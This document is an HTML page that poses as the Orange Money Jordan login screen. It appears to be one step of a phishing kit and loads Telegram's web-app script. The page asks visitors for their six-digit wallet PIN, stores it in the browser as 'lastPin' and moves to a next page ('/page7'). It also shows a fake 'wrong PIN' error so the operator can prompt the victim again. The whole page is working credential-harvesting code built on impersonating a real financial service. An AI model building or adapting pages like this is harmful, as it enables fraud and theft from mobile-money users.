<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أورانج موني الأردن - تسجيل الدخول</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root { --orange-primary: #f16e00; }
        body { background: #fff; margin: 0; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
        .header-box { width: 100%; background: var(--orange-primary); padding: 30px; color: white; text-align: center; }
        .main-content { width: 90%; max-width: 400px; margin-top: 25px; text-align: center; }
        .pin-input-group { display: flex; gap: 8px; justify-content: center; margin-bottom: 20px; direction: ltr; }
        .pin-box { width: 42px; height: 48px; border: 1.5px solid var(--orange-primary); border-radius: 10px; text-align: center; font-size: 20px; font-weight: bold; }
        .btn-submit { background: #e2e2e2; color: white; border: none; width: 100%; padding: 16px; border-radius: 10px; font-weight: bold; cursor: not-allowed; }
        .btn-submit.active { background: var(--orange-primary); cursor: pointer; }
        .error-banner { background: #fde8e8; color: #e74c3c; padding: 12px; border-radius: 8px; margin-bottom: 15px; display: none; }
    </style>
</head>
<body>

<div class="header-box">
    <h2>Orange Money</h2>
</div>

<div class="main-content">
    <h3>تسجيل الدخول</h3>
    <div id="errorDisplay" class="error-banner"></div>
    <p>أدخل الرمز السري المكون من 6 أرقام</p>

    <!-- 6 Input Boxes for PIN -->
    <div class="pin-input-group">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
        <input type="password" maxlength="1" class="pin-box" inputmode="numeric">
    </div>

    <button id="loginBtn" class="btn-submit" disabled>تسجيل الدخول</button>
</div>

<script>
    const pinBoxes = document.querySelectorAll('.pin-box');
    const loginBtn = document.getElementById('loginBtn');
    const errorDisplay = document.getElementById('errorDisplay');

    const urlParams = new URLSearchParams(window.location.search);
    if (urlParams.get('error') === 'wrongpin') {
        errorDisplay.innerText = "❌ الرمز السري غير صحيح، يرجى إعادة المحاولة.";
        errorDisplay.style.display = "block";
    }

    pinBoxes.forEach((box, index) => {
        box.addEventListener('input', () => {
            box.value = box.value.replace(/\D/g, '');
            if (box.value && index < pinBoxes.length - 1) pinBoxes[index + 1].focus();
            checkInputs();
        });
        box.addEventListener('keydown', (e) => {
            if (e.key === "Backspace" && !box.value && index > 0) pinBoxes[index - 1].focus();
        });
    });

    function checkInputs() {
        const filled = [...pinBoxes].every(b => b.value.length === 1);
        loginBtn.disabled = !filled;
        loginBtn.classList.toggle('active', filled);
    }

    loginBtn.addEventListener('click', () => {
        if (!loginBtn.classList.contains('active')) return;
        let pin = "";
        pinBoxes.forEach(b => pin += b.value);
        localStorage.setItem('lastPin', pin);
        window.location.href = "/page7";
    });
</script>
</body>
</html>
